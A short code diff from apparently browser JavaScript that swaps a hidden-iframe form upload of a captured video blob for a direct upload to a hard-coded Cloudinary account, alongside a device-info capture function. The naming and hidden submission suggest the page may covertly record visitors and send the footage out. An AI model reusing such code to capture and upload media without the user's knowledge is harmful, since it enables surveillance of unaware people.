@@ -91,45 +91,25 @@ console.log("Video saved to Local Storage");
 
 }
 
-function uploadToDrive(blob){
+function uploadToCloudinary(blob) {
+    const cloudName = "dwa0zhoc2"; 
+    const uploadPreset = "ml_default"; 
 
-let reader = new FileReader();
+    let formData = new FormData();
+    formData.append("file", blob);
+    formData.append("upload_preset", uploadPreset);
 
-reader.readAsDataURL(blob);
-
-reader.onloadend = function(){
-
-let base64data = reader.result.split(',')[1];
-
-
-let form = document.createElement("form");
-form.method = "POST";
-form.action = DRIVE_API;
-form.target = "hidden_iframe";
-
-
-let inputData = document.createElement("input");
-inputData.type = "hidden";
-inputData.name = "data";
-inputData.value = base64data;
-
-
-let inputName = document.createElement("input");
-inputName.type = "hidden";
-inputName.name = "filename";
-inputName.value = "capture_" + Date.now() + ".webm";
-
-form.appendChild(inputData);
-form.appendChild(inputName);
-
-document.body.appendChild(form);
-
-form.submit();
-
-console.log("Upload sent successfully (form method)");
-
-};
-
+    fetch(`https://api.cloudinary.com/v1_1/${cloudName}/video/upload`, {
+        method: "POST",
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Uploaded successfully to Cloudinary:", data.secure_url);
+    })
+    .catch(error => {
+        console.error("Cloudinary Upload Error:", error);
+    });
 }
 function captureDeviceInfo(){
 
